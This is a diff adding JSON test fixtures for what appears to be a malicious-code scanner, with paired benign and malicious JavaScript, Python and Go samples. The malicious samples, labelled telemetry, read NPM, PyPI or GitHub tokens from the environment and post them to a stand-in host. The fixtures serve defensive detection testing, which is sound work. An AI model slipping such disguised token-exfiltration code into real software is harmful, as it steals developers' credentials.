@@ -1,0 +1,68 @@
+[
+  {
+    "id": "js-ast-only-saturated-exfil",
+    "tags": ["javascript", "malicious", "ast-saturation", "pair-js-saturation"],
+    "files": [
+      {"file": "src/00-safe.js", "content": "export const ready = true;\n"},
+      {"file": "src/99-telemetry.js", "content": "import { env as environment } from 'node:process';\nimport { post as send } from 'axios';\nconst endpoint = ['https:', '', 'collector.invalid', 'x'].join('/');\nconst token = environment.NPM_TOKEN;\nsend(endpoint, token);\n"}
+    ],
+    "routing": {"fileCap": 1, "secondaryFileCap": 0},
+    "expectedRuleIds": ["credential-exfiltration"],
+    "expectedFindings": [{"file": "src/99-telemetry.js", "ruleId": "credential-exfiltration"}]
+  },
+  {
+    "id": "js-ast-only-saturated-benign",
+    "tags": ["javascript", "benign", "ast-saturation", "pair-js-saturation"],
+    "files": [
+      {"file": "src/00-safe.js", "content": "export const ready = true;\n"},
+      {"file": "src/99-telemetry.js", "content": "import { env as environment } from 'node:process';\nimport { post as send } from 'axios';\nconst endpoint = ['https:', '', 'metrics.internal.example', 'builds'].join('/');\nconst buildId = environment.BUILD_ID;\nsend(endpoint, { buildId });\n"}
+    ],
+    "routing": {"fileCap": 1, "secondaryFileCap": 0},
+    "expectedRuleIds": [],
+    "expectedFindings": []
+  },
+  {
+    "id": "py-ast-only-saturated-exfil",
+    "tags": ["python", "malicious", "ast-saturation", "pair-py-saturation"],
+    "files": [
+      {"file": "src/00_safe.py", "content": "READY = True\n"},
+      {"file": "src/99_telemetry.py", "content": "from os import getenv as read\nfrom requests import post as send\nendpoint = 'https:' + '//' + 'collector.invalid/x'\ntoken = read('PYPI_TOKEN')\nsend(endpoint, data=token)\n"}
+    ],
+    "routing": {"fileCap": 1, "secondaryFileCap": 0},
+    "expectedRuleIds": ["credential-exfiltration"],
+    "expectedFindings": [{"file": "src/99_telemetry.py", "ruleId": "credential-exfiltration"}]
+  },
+  {
+    "id": "py-ast-only-saturated-benign",
+    "tags": ["python", "benign", "ast-saturation", "pair-py-saturation"],
+    "files": [
+      {"file": "src/00_safe.py", "content": "READY = True\n"},
+      {"file": "src/99_telemetry.py", "content": "from os import getenv as read\nfrom requests import post as send\nendpoint = 'https:' + '//' + 'metrics.internal.example/builds'\nbuild_id = read('BUILD_ID')\nsend(endpoint, json={'build_id': build_id})\n"}
+    ],
+    "routing": {"fileCap": 1, "secondaryFileCap": 0},
+    "expectedRuleIds": [],
+    "expectedFindings": []
+  },
+  {
+    "id": "go-ast-only-saturated-exfil",
+    "tags": ["go", "malicious", "ast-saturation", "pair-go-saturation"],
+    "files": [
+      {"file": "src/00_safe.go", "content": "package source\nconst ready = true\n"},
+      {"file": "src/99_telemetry.go", "content": "package source\nimport environment \"os\"\nimport web \"net/http\"\nimport \"strings\"\nfunc sync(){ endpoint := \"https:\" + \"//collector.invalid/x\"; token := environment.Getenv(\"GITHUB_TOKEN\"); web.Post(endpoint, \"text/plain\", strings.NewReader(token)) }\n"}
+    ],
+    "routing": {"fileCap": 1, "secondaryFileCap": 0},
+    "expectedRuleIds": ["credential-exfiltration"],
+    "expectedFindings": [{"file": "src/99_telemetry.go", "ruleId": "credential-exfiltration"}]
+  },
+  {
+    "id": "go-ast-only-saturated-benign",
+    "tags": ["go", "benign", "ast-saturation", "pair-go-saturation"],
+    "files": [
+      {"file": "src/00_safe.go", "content": "package source\nconst ready = true\n"},
+      {"file": "src/99_telemetry.go", "content": "package source\nimport environment \"os\"\nimport web \"net/http\"\nimport \"strings\"\nfunc sync(){ endpoint := \"https:\" + \"//metrics.internal.example/builds\"; buildID := environment.Getenv(\"BUILD_ID\"); web.Post(endpoint, \"text/plain\", strings.NewReader(buildID)) }\n"}
+    ],
+    "routing": {"fileCap": 1, "secondaryFileCap": 0},
+    "expectedRuleIds": [],
+    "expectedFindings": []
+  }
+]
